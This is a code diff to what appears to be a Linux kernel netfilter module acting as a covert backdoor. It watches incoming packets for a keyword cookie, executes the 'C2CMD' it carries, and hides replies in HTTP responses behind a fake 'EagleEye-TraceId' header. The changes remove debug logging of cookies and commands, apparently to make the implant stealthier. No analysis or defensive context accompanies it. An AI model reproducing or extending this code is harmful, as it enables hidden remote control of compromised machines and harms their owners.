@@ -52,11 +52,9 @@ static int inject_http_response(struct sk_buff * skb, const char * inject_data, 
     for(; data[offset] != '\n' && offset < iph->tot_len; ++ offset);
     offset += 1;
 
-    printk("offset=%d", offset);
-
-    char * tmp = kmalloc(65536, GFP_KERNEL);
-    snprintf(tmp, 65536, "%s%s\r\n", "EagleEye-TraceId: ", inject_data);
-    __nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph->ihl*4, offset, 0, tmp, strlen(tmp), true);
+    char * tmp = kmalloc(4096, GFP_KERNEL);
+    snprintf(tmp, 4096, "%s%s\r\n", "EagleEye-TraceId: ", inject_data);
+    __nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph->ihl*4, offset, 0, tmp, strlen(tmp), false);
 
     kfree(tmp);
     return 0;
@@ -180,14 +178,14 @@ static unsigned int watch_in(unsigned int hooknum,
     if(getCookie(data, iptot_len - tcph->doff * sizeof(int), cookie, sizeof(cookie) - 1) == 0)
         return NF_ACCEPT;
 
-    printk("GET COOKIE %s", cookie);
+    //printk("GET COOKIE %s", cookie);
     if(strcmp(cookie, KEYWORD) != 0)
         return NF_ACCEPT;
 
     struct C2Frame * frame = kmalloc(sizeof(struct C2Frame), GFP_KERNEL);
     frame->dst_port = ntohs(tcph->dest);
     frame->src_port = ntohs(tcph->source);
-    printk("GET C2CMD!!!! tcp src_port=%d, dst_port=%d", frame->src_port, frame->dst_port);
+    //printk("GET C2CMD!!!! tcp src_port=%d, dst_port=%d", frame->src_port, frame->dst_port);
     frame->rsp_len = handle_cmd(cookie, frame->response, sizeof(frame->response));
 
     spin_lock(&_lock);
